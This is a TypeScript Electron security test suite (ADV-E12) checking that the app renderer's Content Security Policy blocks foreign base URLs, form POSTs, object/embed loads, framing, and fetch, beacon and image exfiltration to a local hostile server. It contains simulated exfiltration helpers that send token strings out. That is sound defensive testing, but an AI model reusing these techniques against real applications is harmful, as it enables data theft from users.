/**
 * ADV-E12. base-uri, form-action, object-src, frame-ancestors, and connect-src
 * (fetch or img exfiltration) must hold on the built renderer and on the dev
 * renderer loaded through ELECTRON_RENDERER_URL.
 *
 * base-uri and form-action do not fall back to default-src. They are set on
 * the renderer meta policy. A foreign form POST is also cancelled by the
 * main-frame navigation guard. frame-ancestors is ignored in a meta tag, so
 * the dev harness (which serves the renderer itself) and a local file: parent
 * stay `it.fails`. object-src and connect-src fall back to default-src 'self'
 * and are enforced today.
 *
 * WebFrameMain.url stays on the blocked URL when frame-ancestors rejects a
 * response, so embed checks read location.href inside the child frame.
 */
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { setTimeout as delay } from 'node:timers/promises'
import { fileURLToPath } from 'node:url'
import type { ElectronApplication, Page } from 'playwright'
import { expect, it, onTestFinished } from 'vitest'
import type { AgentequeApi } from '../../../src/shared/ipc'
import {
  type HostileRequest,
  type HostileResponse,
  type HostileServer,
  launchApp,
  startHostileServer,
} from '../helpers/electron'

declare module 'vitest' {
  interface TaskMeta {
    id?: string
  }
}

const ADV_E12 = { id: 'ADV-E12' } as const
const SETTLE_MS = 2_000
const RENDERER_HTML = readFileSync(
  fileURLToPath(new URL('../../../src/renderer/index.html', import.meta.url)),
  'utf8',
)

const MODES = ['production', 'dev'] as const
type Mode = (typeof MODES)[number]

interface PolicyViolation {
  blockedURI: string
  effectiveDirective: string
  disposition: string
}

interface Session {
  mode: Mode
  page: Page
  app: ElectronApplication
  home: string
  hostile: HostileServer
  dev: HostileServer | null
}

interface FrameRead {
  href: string
  title: string
}

interface PageElement {
  href: string
  src: string
  data: string
  type: string
  method: string
  action: string
  name: string
  value: string
  append(node: PageElement): void
  submit(): void
}

type RendererGlobal = typeof globalThis & {
  document: {
    baseURI: string
    head: { append(node: PageElement): void }
    body: { append(node: PageElement): void; innerText: string }
    createElement(tag: string): PageElement
    addEventListener(type: string, listener: (event: PolicyViolation) => void): void
  }
  location: { href: string }
  navigator: { sendBeacon(url: string, data: string): boolean }
  Image: new () => {
    src: string
    addEventListener(type: 'load' | 'error', listener: () => void): void
  }
  fetch(
    input: string,
    init?: { method?: string; body?: string; cache?: 'no-store'; mode?: 'no-cors' },
  ): Promise<unknown>
  api?: AgentequeApi
}

for (const mode of MODES) {
  it(`ADV-E12 ${mode} base-uri blocks a foreign base URL`, { meta: ADV_E12 }, async () => {
    await withMode(mode, async ({ page, hostile }) => {
      const result = await page.evaluate(installForeignBase, `${hostile.origin}/owned/`)
      expect(result.after).toBe(result.before)
      expect(result.resolved).toBe(new URL('rel-path', result.page).href)
      expect(result.resolved.startsWith(`${hostile.origin}/`)).toBe(false)
    })
  })

  it(`ADV-E12 ${mode} form-action blocks a foreign form POST`, { meta: ADV_E12 }, async () => {
    await withMode(mode, async ({ page, home, hostile }) => {
      const action = `${hostile.origin}/e12-form`
      const left = page
        .waitForURL((url) => url.href !== home, { timeout: SETTLE_MS })
        .then(() => true)
        .catch(() => false)
      await page.evaluate(submitForeignForm, action)
      const navigated = await left
      const posted = await requestArrived(
        hostile,
        (request) =>
          request.method === 'POST' &&
          request.url.split('?')[0] === '/e12-form' &&
          request.body.toString('utf8').includes('secret=e12-token'),
        navigated ? 1_000 : SETTLE_MS,
      )
      const landed = (await page.locator('body').innerText()).includes('e12-landed')
      const apiExposed = await page.evaluate(preloadApiExposed)
      expect({ url: page.url(), navigated, posted, landed, apiExposed }).toEqual({
        url: home,
        navigated: false,
        posted: false,
        landed: false,
        apiExposed: true,
      })
    })
  })

  it(`ADV-E12 ${mode} object-src blocks a foreign object and embed`, async () => {
    await withMode(mode, async ({ page, hostile }) => {
      const objectUrl = `${hostile.origin}/e12-object`
      const embedUrl = `${hostile.origin}/e12-embed`
      const result = await page.evaluate(loadForeignPlugin, {
        objectUrl,
        embedUrl,
        waitMs: SETTLE_MS,
      })
      const objectViolations = result.violations.filter(
        (violation) => violation.effectiveDirective === 'object-src',
      )
      expect(objectViolations.length).toBeGreaterThanOrEqual(2)
      expect(
        objectViolations.every(
          (violation) =>
            violation.disposition === 'enforce' && violation.blockedURI.startsWith(hostile.origin),
        ),
      ).toBe(true)
      expect(paths(hostile)).not.toContain('/e12-object')
      expect(paths(hostile)).not.toContain('/e12-embed')
    })
  })

  it(`ADV-E12 ${mode} connect-src blocks fetch and img exfiltration`, async () => {
    await withMode(mode, async ({ page, hostile }) => {
      const fetchUrl = `${hostile.origin}/e12-fetch`
      const noCorsUrl = `${hostile.origin}/e12-nocors`
      const beaconUrl = `${hostile.origin}/e12-beacon`
      const imageUrl = `${hostile.origin}/e12-img`
      const result = await page.evaluate(exfiltrate, {
        fetchUrl,
        noCorsUrl,
        beaconUrl,
        imageUrl,
        waitMs: SETTLE_MS,
      })
      expect(result.fetchResult).toBe('rejected:TypeError')
      expect(result.noCors).toBe('rejected:TypeError')
      expect(result.image).toBe('error')
      expect(result.violations).toEqual(
        expect.arrayContaining([
          { blockedURI: fetchUrl, effectiveDirective: 'connect-src', disposition: 'enforce' },
          { blockedURI: noCorsUrl, effectiveDirective: 'connect-src', disposition: 'enforce' },
          { blockedURI: beaconUrl, effectiveDirective: 'connect-src', disposition: 'enforce' },
          { blockedURI: imageUrl, effectiveDirective: 'img-src', disposition: 'enforce' },
        ]),
      )
      expect(paths(hostile).filter((path) => path.startsWith('/e12-'))).toEqual([])
    })
  })
}

it('ADV-E12 production frame-ancestors blocks a remote parent', async () => {
  await withMode('production', async ({ app, home }) => {
    const parent = await startHostileServer(() => parentPage(home))
    const framed = await framedDocument(app, { url: `${parent.origin}/` })
    expect(framed.title).not.toBe('agenteque')
    expect(framed.href).not.toBe(home)
    expect(framed.href.startsWith('file:')).toBe(false)
  })
})

it.fails(
  'ADV-E12 production frame-ancestors blocks another local document',
  { meta: ADV_E12 },
  async () => {
    await withMode('production', async ({ app, home }) => {
      const framed = await framedDocument(app, { filePath: writeParentFile(home) })
      expect(framed.title).not.toBe('agenteque')
      expect(framed.href).not.toBe(home)
    })
  },
)

it.fails('ADV-E12 dev frame-ancestors blocks a foreign origin', { meta: ADV_E12 }, async () => {
  await withMode('dev', async ({ app, home, dev }) => {
    if (!dev) throw new Error('dev renderer server was not started')
    const scriptsBefore = paths(dev).filter((path) => path === '/src/main.ts').length
    const parent = await startHostileServer(() => parentPage(home))
    const framed = await framedDocument(app, { url: `${parent.origin}/` })
    const scriptsAfter = paths(dev).filter((path) => path === '/src/main.ts').length
    expect(framed.title).not.toBe('agenteque')
    expect(framed.href.startsWith(`${dev.origin}/`)).toBe(false)
    expect(scriptsAfter).toBe(scriptsBefore)
  })
})

function parentPage(victimUrl: string): HostileResponse {
  return {
    status: 200,
    headers: { 'content-type': 'text/html; charset=utf-8' },
    body: `<!doctype html><title>parent</title><iframe src="${victimUrl}"></iframe>`,
  }
}

function writeParentFile(victimUrl: string): string {
  const dir = mkdtempSync(join(tmpdir(), 'agenteque-e12-'))
  const filePath = join(dir, 'parent.html')
  writeFileSync(filePath, parentPage(victimUrl).body ?? '', 'utf8')
  onTestFinished(() => {
    rmSync(dir, { recursive: true, force: true })
  })
  return filePath
}

async function withMode(mode: Mode, run: (session: Session) => Promise<void>): Promise<void> {
  const hostile = await startHostileServer(() => ({
    status: 200,
    headers: { 'content-type': 'text/html; charset=utf-8' },
    body: '<!doctype html><title>hostile</title><p>e12-landed</p>',
  }))
  const dev = mode === 'dev' ? await startDevRenderer() : null
  const launched = await launchApp(
    dev ? { env: { ELECTRON_RENDERER_URL: `${dev.origin}/` } } : undefined,
  )
  try {
    const page = launched.window
    if (!page) throw new Error(`${mode} renderer did not open a window`)
    const home = await settleRenderer(mode, page, dev)
    await run({ mode, page, app: launched.app, home, hostile, dev })
  } finally {
    await launched.close()
  }
}

async function settleRenderer(mode: Mode, page: Page, dev: HostileServer | null): Promise<string> {
  if (mode === 'production') {
    await page.locator('h1').waitFor()
    expect(await page.locator('h1').textContent()).toBe('agenteque')
    const url = page.url()
    expect(url.startsWith('file:'), url).toBe(true)
    expect(url, url).toContain('/renderer/index.html')
    return url
  }
  if (!dev) throw new Error('dev renderer server was not started')
  await page.locator('#app').waitFor({ state: 'attached' })
  const url = page.url()
  expect(url.startsWith(`${dev.origin}/`), url).toBe(true)
  expect(await page.title()).toBe('agenteque')
  return url
}

async function startDevRenderer(): Promise<HostileServer> {
  return startHostileServer((request) => devRendererResponse(request))
}

function devRendererResponse(request: HostileRequest): HostileResponse {
  const path = request.url.split('?')[0]
  if (path === '/' || path === '/index.html') {
    return {
      status: 200,
      headers: { 'content-type': 'text/html; charset=utf-8' },
      body: RENDERER_HTML,
    }
  }
  return {
    status: 404,
    headers: { 'content-type': 'text/plain; charset=utf-8' },
    body: 'missing',
  }
}

async function framedDocument(
  app: ElectronApplication,
  parent: { url?: string; filePath?: string },
): Promise<FrameRead> {
  return app.evaluate(async ({ BrowserWindow }, target) => {
    const win = new BrowserWindow({
      show: false,
      webPreferences: {
        contextIsolation: true,
        sandbox: true,
        nodeIntegration: false,
      },
    })
    try {
      if (target.filePath) await win.loadFile(target.filePath)
      else if (target.url) await win.loadURL(target.url)
      else throw new Error('framedDocument requires a parent url or file')
      const deadline = Date.now() + 2_000
      let href = ''
      let title = ''
      while (Date.now() < deadline) {
        const frame = win.webContents.mainFrame.frames[0]
        if (frame && !frame.detached) {
          try {
            const read: unknown = await frame.executeJavaScript(
              '({ href: location.href, title: document.title })',
            )
            if (read && typeof read === 'object') {
              const record = read as { href?: unknown; title?: unknown }
              href = typeof record.href === 'string' ? record.href : ''
              title = typeof record.title === 'string' ? record.title : ''
            }
          } catch {
            // The child frame is between navigations.
          }
        }
        if (title === 'agenteque' || href.startsWith('chrome-error:')) break
        await new Promise((resolve) => setTimeout(resolve, 50))
      }
      return { href, title }
    } finally {
      win.destroy()
    }
  }, parent)
}

function paths(server: HostileServer): string[] {
  return server.requests.map((request) => request.url.split('?')[0])
}

async function requestArrived(
  server: HostileServer,
  predicate: (request: HostileRequest) => boolean,
  timeoutMs: number,
): Promise<boolean> {
  const deadline = Date.now() + timeoutMs
  while (Date.now() < deadline) {
    if (server.requests.some(predicate)) return true
    await delay(20)
  }
  return server.requests.some(predicate)
}

function installForeignBase(baseHref: string): {
  before: string
  after: string
  resolved: string
  page: string
} {
  const view = globalThis as RendererGlobal
  const before = view.document.baseURI
  const base = view.document.createElement('base')
  base.href = baseHref
  view.document.head.append(base)
  const anchor = view.document.createElement('a')
  anchor.href = 'rel-path'
  return { before, after: view.document.baseURI, resolved: anchor.href, page: view.location.href }
}

function submitForeignForm(action: string): void {
  const view = globalThis as RendererGlobal
  const form = view.document.createElement('form')
  form.method = 'POST'
  form.action = action
  const input = view.document.createElement('input')
  input.name = 'secret'
  input.value = 'e12-token'
  form.append(input)
  view.document.body.append(form)
  form.submit()
}

async function preloadApiExposed(): Promise<boolean> {
  const view = globalThis as RendererGlobal
  if (!view.api) return false
  try {
    const versions = await view.api.getVersions()
    return (
      versions.app.length > 0 &&
      versions.electron.length > 0 &&
      versions.chrome.length > 0 &&
      versions.node.length > 0
    )
  } catch {
    return false
  }
}

function loadForeignPlugin(input: {
  objectUrl: string
  embedUrl: string
  waitMs: number
}): Promise<{ violations: PolicyViolation[] }> {
  const view = globalThis as RendererGlobal
  const violations: PolicyViolation[] = []
  view.document.addEventListener('securitypolicyviolation', (event) => {
    violations.push({
      blockedURI: event.blockedURI,
      effectiveDirective: event.effectiveDirective,
      disposition: event.disposition,
    })
  })
  const object = view.document.createElement('object')
  object.data = input.objectUrl
  object.type = 'text/html'
  view.document.body.append(object)
  const embed = view.document.createElement('embed')
  embed.src = input.embedUrl
  embed.type = 'text/html'
  view.document.body.append(embed)
  return new Promise((resolve) => {
    const deadline = Date.now() + input.waitMs
    const finish = (): void => {
      if (
        violations.filter((violation) => violation.effectiveDirective === 'object-src').length >=
          2 ||
        Date.now() >= deadline
      ) {
        resolve({ violations })
        return
      }
      setTimeout(finish, 20)
    }
    finish()
  })
}

function exfiltrate(input: {
  fetchUrl: string
  noCorsUrl: string
  beaconUrl: string
  imageUrl: string
  waitMs: number
}): Promise<{
  fetchResult: string
  noCors: string
  image: string
  violations: PolicyViolation[]
}> {
  const view = globalThis as RendererGlobal
  const violations: PolicyViolation[] = []
  view.document.addEventListener('securitypolicyviolation', (event) => {
    violations.push({
      blockedURI: event.blockedURI,
      effectiveDirective: event.effectiveDirective,
      disposition: event.disposition,
    })
  })
  const fetchResult = view
    .fetch(input.fetchUrl, { method: 'POST', body: 'fetch-token', cache: 'no-store' })
    .then(() => 'fulfilled')
    .catch((error: unknown) => (error instanceof Error ? `rejected:${error.name}` : 'rejected'))
  const noCors = view
    .fetch(input.noCorsUrl, { mode: 'no-cors', cache: 'no-store' })
    .then(() => 'fulfilled')
    .catch((error: unknown) => (error instanceof Error ? `rejected:${error.name}` : 'rejected'))
  view.navigator.sendBeacon(input.beaconUrl, 'beacon-token')
  const image = new Promise<string>((resolve) => {
    const img = new view.Image()
    const timer = setTimeout(() => resolve('timeout'), input.waitMs)
    img.addEventListener('load', () => {
      clearTimeout(timer)
      resolve('loaded')
    })
    img.addEventListener('error', () => {
      clearTimeout(timer)
      resolve('error')
    })
    img.src = input.imageUrl
  })
  return Promise.all([fetchResult, noCors, image]).then(
    ([fetchOutcome, noCorsOutcome, imageOutcome]) =>
      new Promise((resolve) => {
        const deadline = Date.now() + input.waitMs
        const finish = (): void => {
          const seen = new Set(violations.map((violation) => violation.blockedURI))
          const ready =
            seen.has(input.fetchUrl) &&
            seen.has(input.noCorsUrl) &&
            seen.has(input.beaconUrl) &&
            seen.has(input.imageUrl)
          if (ready || Date.now() >= deadline) {
            resolve({
              fetchResult: fetchOutcome,
              noCors: noCorsOutcome,
              image: imageOutcome,
              violations,
            })
            return
          }
          setTimeout(finish, 20)
        }
        finish()
      }),
  )
}
